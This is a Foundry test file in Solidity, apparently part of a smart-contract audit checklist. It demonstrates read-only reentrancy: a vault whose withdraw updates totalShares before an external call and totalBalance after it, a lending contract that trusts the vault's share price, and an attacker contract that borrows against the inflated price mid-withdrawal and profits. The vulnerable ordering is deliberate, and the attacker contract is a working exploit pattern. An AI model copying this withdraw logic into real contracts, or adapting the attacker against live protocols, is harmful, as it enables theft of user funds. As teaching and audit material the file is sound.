// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * Overview:
 * Checklist Item ID: SOL-AM-ReentrancyAttack-2
 *
 * This test demonstrates a read-only reentrancy attack vulnerability in a lending protocol that uses vault share prices as collateral oracle.
 * The vault's withdraw function updates totalShares before making an external call, but updates totalBalance after the call.
 * During the external call (reentrancy window), getSharePrice() returns an inflated value due to reduced totalShares but unchanged totalBalance.
 * The attacker exploits this by borrowing against their collateral during the reentrancy, receiving more funds than the real collateral value should allow.
 */

// Vault that issues shares for ETH deposits
contract Vault {
    mapping(address => uint256) public shares;
    mapping(address => mapping(address => uint256)) public allowances;
    uint256 public totalShares;
    uint256 public totalBalance; // Track ETH balance internally

    function deposit() external payable {
        uint256 sharesToMint = msg.value; // 1:1 for simplicity
        shares[msg.sender] += sharesToMint;
        totalShares += sharesToMint;
        totalBalance += msg.value; // Update internal balance tracker
    }

    function withdraw(uint256 shareAmount) external {
        require(shares[msg.sender] >= shareAmount, "Insufficient shares");

        uint256 ethAmount = (shareAmount * totalBalance) / totalShares;
        shares[msg.sender] -= shareAmount;
        totalShares -= shareAmount; // Update totalShares BEFORE external call - VULNERABILITY

        // External call with ETH transfer - totalBalance not yet updated creates inflated price
        (bool success,) = msg.sender.call{value: ethAmount}("");
        require(success, "Transfer failed");

        totalBalance -= ethAmount; // Update totalBalance AFTER external call
    }

    // Returns ETH value per share - can be manipulated during reentrancy
    function getSharePrice() public view returns (uint256) {
        if (totalShares == 0) return 1e18;
        return (totalBalance * 1e18) / totalShares; // Use internal balance tracker
    }

    // Approve another address to transfer shares on your behalf
    function approve(address spender, uint256 amount) external {
        allowances[msg.sender][spender] = amount;
    }

    // Transfer shares from one address to another (requires approval)
    function transferFrom(address from, address to, uint256 amount) external {
        require(shares[from] >= amount, "Insufficient shares");

        if (from != msg.sender) {
            require(allowances[from][msg.sender] >= amount, "Insufficient allowance");
            allowances[from][msg.sender] -= amount;
        }

        shares[from] -= amount;
        shares[to] += amount;
    }
}

// Lending protocol that uses vault share price as collateral oracle
contract LendingProtocol {
    Vault public vault;
    mapping(address => uint256) public collateralShares;
    mapping(address => uint256) public debt;

    constructor(Vault _vault) {
        vault = _vault;
    }

    // Allow funding the protocol
    function fund() external payable {}

    function depositCollateral(uint256 shareAmount) external {
        require(vault.shares(msg.sender) >= shareAmount, "Insufficient vault shares");

        // Transfer shares from user to this contract as collateral
        vault.transferFrom(msg.sender, address(this), shareAmount);
        collateralShares[msg.sender] += shareAmount;
    }

    function borrow() external {
        uint256 sharePrice = vault.getSharePrice();
        uint256 collateralValue = (collateralShares[msg.sender] * sharePrice) / 1e18;
        uint256 maxBorrow = collateralValue * 99 / 100; // 99% LTV for maximum impact

        require(maxBorrow > debt[msg.sender], "Insufficient collateral");
        uint256 borrowAmount = maxBorrow - debt[msg.sender];

        require(address(this).balance >= borrowAmount, "Insufficient lending pool funds");

        debt[msg.sender] += borrowAmount;
        (bool success,) = msg.sender.call{value: borrowAmount}("");
        require(success, "Borrow transfer failed");
    }
}

// Attacker exploits read-only reentrancy for profit
contract Attacker {
    Vault vault;
    LendingProtocol lending;
    uint256 public profit;
    uint256 private initialBalance;
    uint256 private investment;
    bool private attacking = false;

    constructor(Vault _vault, LendingProtocol _lending) {
        vault = _vault;
        lending = _lending;
    }

    function exploit() external payable {
        initialBalance = address(this).balance - msg.value; // Balance before receiving msg.value
        investment = msg.value;

        // 1. Deposit to vault to get shares (double the amount needed)
        vault.deposit{value: msg.value}();
        uint256 shareAmount = msg.value / 2; // Use half for collateral, half for withdrawal

        // 2. Approve lending protocol to transfer shares
        vault.approve(address(lending), shareAmount);

        // 3. Deposit half shares as collateral to lending protocol
        lending.depositCollateral(shareAmount);

        // 4. Trigger withdrawal with remaining shares to cause reentrancy
        attacking = true;
        vault.withdraw(shareAmount);
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            // During reentrancy: share price is inflated because:
            // - totalShares has been reduced in withdraw()
            // - But totalBalance hasn't been updated yet
            // This makes remaining shares appear more valuable

            uint256 manipulatedPrice = vault.getSharePrice();
            console.log("Share price during reentrancy:", manipulatedPrice);

            // Borrow maximum based on inflated collateral value
            try lending.borrow() {
                console.log("Successfully borrowed during reentrancy");
            } catch {
                // May fail if insufficient lending pool funds
            }
        }
    }

    function calculateProfit() external {
        uint256 finalBalance = address(this).balance;
        // Profit = final balance - initial balance - investment
        if (finalBalance > initialBalance + investment) {
            profit = finalBalance - initialBalance - investment;
        } else {
            profit = 0;
        }
    }
}

contract ReadOnlyReentrancyTest is Test {
    function testRealReadOnlyReentrancyExploit() public {
        // Setup contracts
        Vault vault = new Vault();
        LendingProtocol lending = new LendingProtocol(vault);
        Attacker attacker = new Attacker(vault, lending);

        // Fund lending protocol
        lending.fund{value: 10 ether}();

        // Setup vault with existing liquidity (other users)
        vault.deposit{value: 10 ether}();

        console.log("=== Before Attack ===");
        console.log("Vault totalBalance:", vault.totalBalance());
        console.log("Vault total shares:", vault.totalShares());
        console.log("Share price:", vault.getSharePrice());
        console.log("Attacker balance:", address(attacker).balance);

        uint256 initialAttackerBalance = address(attacker).balance;

        // Execute the exploit
        attacker.exploit{value: 2 ether}();
        attacker.calculateProfit();

        console.log("\n=== After Attack ===");
        console.log("Vault totalBalance:", vault.totalBalance());
        console.log("Vault total shares:", vault.totalShares());
        console.log("Share price:", vault.getSharePrice());
        console.log("Attacker balance:", address(attacker).balance);
        console.log("Attacker profit:", attacker.profit());

        // Verify the exploit worked
        assertGt(address(attacker).balance, initialAttackerBalance, "Attacker should have made profit");
        assertGt(attacker.profit(), 0, "Profit should be greater than 0");

        console.log("\n=== Exploit Summary ===");
        console.log("1. Attacker invested 2 ETH, deposited to vault, received 2 shares");
        console.log("2. Used 1 share as collateral in lending protocol");
        console.log("3. During withdrawal, totalShares reduced before totalBalance updated");
        console.log("4. This temporarily inflated share price during reentrancy");
        console.log("5. Attacker borrowed extra ETH based on inflated collateral value");
        console.log("6. Net profit:", attacker.profit(), "wei");
    }
}
